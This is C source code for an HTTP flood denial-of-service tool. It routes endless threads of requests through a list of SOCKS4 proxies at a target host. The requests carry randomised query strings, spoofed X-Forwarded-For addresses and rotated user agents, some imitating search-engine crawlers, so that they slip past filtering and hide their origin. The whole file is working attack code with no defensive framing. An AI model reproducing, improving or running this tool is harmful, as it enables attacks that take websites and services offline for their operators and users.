#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>


struct hostent *host;
struct timeval tv;
int port;
char *ip;
int bots;
char useragents[20][512];
char method[3][10];

struct socks4 {
 char ver;
 char cmd;
 short port;
 unsigned int ip;
 char login;
};

struct proxy {
 char ip[32];
 int port;
}proxies[100000];

char *make_req() {
 char *req = malloc(2048); 
 char rand1[32];
 memset(rand1, 0, 32); 
 char rand2[32]; 
 memset(rand2, 0, 32);
 char fakeip[32];
 int a,b,c,d; 
 a = rand() % (255 - 0) + 0;
 b = rand() % (255 - 0) + 0;
 c = rand() % (255 - 0) + 0;
 d = rand() % (255 - 0) + 0;
 sprintf(fakeip, "%d.%d.%d.%d", a, b, c, d);
 int size1;
 int size2;
 size1 = rand() % (32 - 0) + 0; 
 size2 = rand() % (32 - 0) + 0; 
 for(int i = 0; i < size1; i++) {
  rand1[i] = rand() % (0x7b - 0x61) + 0x61;
 }
 for(int i = 0; i < size2; i++) {
  rand2[i] = rand() % (0x7b - 0x61) + 0x61;
 }
 int i = rand() % (20 - 0) + 0;
 int f = rand() % (3 - 0) + 0;
 sprintf(req, "%s /?%s=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate,br\r\nConnection: keep-alive\r\nX-Forwarded-For: %s\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nPragma: no-cache\r\n\r\n", method[f], rand1, rand2, ip, useragents[i], fakeip);
 memset(rand1, 0, 32);
 memset(rand2, 0, 32); 
 memset(fakeip, 0, 32); 
 size1 = 0;
 size2 = 0; 
 return req;
}

void *sendtor(void *unused) {
 while(1) {
  char *req;
  int i;
  i = rand() % (bots - 0) + 0;
  struct socks4 packeds;
  struct sockaddr_in sa;
  sa.sin_addr.s_addr = inet_addr(proxies[i].ip); 
  sa.sin_port = htons(proxies[i].port); 
  sa.sin_family = AF_INET; 
  packeds.ver = 4;
  packeds.cmd = 1; 
  packeds.port = htons(port); 
  packeds.ip = *((unsigned int *)host->h_addr); 
  int fd = socket(AF_INET, SOCK_STREAM, 0); 
  setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
   send(fd, &packeds, 9, MSG_NOSIGNAL);
   while((req = make_req()) && send(fd, req, strlen(req), MSG_NOSIGNAL) != -1) dprintf(1, "%s", req); free(req);
  }
  close(fd);
 }
}

int makeproxies(char *file) {
 FILE *fd;
 char proxylist[100000][32]; 
 if((fd = fopen(file, "r"))) {
  int b = 0;
  while(1) {
   if(fgets(proxylist[b], 32, fd) == 0) break;
   b++; 
   if(b == 99999) break;
  }
  bots = b;
  for(int i = 0; i < bots; i++) {
   char *portt;
   if((portt = strstr(proxylist[i], ":"))) {
    proxies[i].port = atoi(portt+1);
    int size = strlen(portt+1);
    size++; 
    memcpy(proxies[i].ip, proxylist[i], strlen(proxylist[i]) - size);
   }
   dprintf(1, "%s:%d\n", proxies[i].ip, proxies[i].port);
  }
  sleep(1);
 } else {
  dprintf(1, "file does not exist\n"); 
  exit(0); 
 }
}

int makeagents() {
 strcpy(useragents[0], "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"); 
 strcpy(useragents[1], "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"); 
 strcpy(useragents[2], "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"); 
 strcpy(useragents[3], "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"); 
 strcpy(useragents[4], "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"); 
 strcpy(useragents[5], "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"); 
 strcpy(useragents[6], "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"); 
 strcpy(useragents[7], "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"); 
 strcpy(useragents[8], "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36"); 
 strcpy(useragents[9], "Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1"); 
 strcpy(useragents[10], "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"); 
 strcpy(useragents[11], "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"); 
 strcpy(useragents[12], "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"); 
 strcpy(useragents[13], "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G570Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"); 
 strcpy(useragents[14], "Mozilla/5.0 (Linux; U; Android-4.0.3; en-us; Galaxy Nexus Build/IML74K) AppleWebKit/535.7 (KHTML, like Gecko) CrMo/16.0.912.75 Mobile Safari/535.7"); 
 strcpy(useragents[15], "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"); 
 strcpy(useragents[16], "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"); 
 strcpy(useragents[17], "Baiduspider+(+http://www.baidu.com/search/spider.htm)"); 
 strcpy(useragents[18], "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)"); 
 strcpy(useragents[19], "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)");
 strcpy(method[0], "GET"); 
 strcpy(method[1], "POST"); 
 strcpy(method[2], "HEAD");
}

int main(int argc, char **argv) {
 makeagents();
 srand(time(0));
 tv.tv_sec = 1;
 if(argc < 5) {
  dprintf(1, "domain/ip port proxies_file threads\n");
  return 0; 
 }
 port = atoi(argv[2]);
 ip = argv[1];
 if((host = gethostbyname(ip))) {
  makeproxies(argv[3]);
  pthread_t threads[atoi(argv[4])];
  while(1) {
   for(int i = 0; i < atoi(argv[4]); i++) {
    pthread_create(&threads[i], 0, &sendtor, 0);
   }
   for(int i = 0; i < atoi(argv[4]); i++) {
    pthread_join(threads[i], 0);
   }
  }
 } else {
  dprintf(1, "Could not resolve address\n");
 }
}